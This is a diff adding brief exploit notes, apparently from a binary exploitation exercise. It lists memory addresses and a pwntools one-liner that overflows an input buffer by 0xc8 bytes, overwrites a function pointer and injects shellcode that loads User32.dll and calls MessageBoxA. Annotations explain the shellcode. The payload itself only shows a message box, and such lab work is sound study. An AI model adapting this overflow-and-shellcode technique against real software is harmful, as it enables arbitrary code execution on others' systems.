@@ -1,0 +1,10 @@
+0x00402000 = LoadLibraryA
+0x00402004 = GetProcAddress
+0x00403380 = INPUT
+0x00403448 = fct ptr (0xc8 offset from INPUT)
+
+0x403451 = 'MessageBoxA\x00'
+0x40345d = 'User32.dll\x00'
+
+ python -c "from pwn import *;print 'A'*0xc8 + p32(0x040344c) + 'ff2569344000'.decode('hex')+'MessageBoxA\x00'+'User32.dll\x00'+p32(0x403469+4)+'\x68\x5e\x34\x40\x00'+'\xFF\x15\x00\x20\x40\x00'+'\x68\x52\x34\x40\x00'+'P'+'\xFF\x15\x04\x20\x40\x00'+'j\x00'+'h^4@\x00'*2+'j\x00'+'\xff\xd0'" > input.txt
+                                                                      jump over strings         len 12            len 11                           push Userdll str          call loadLib
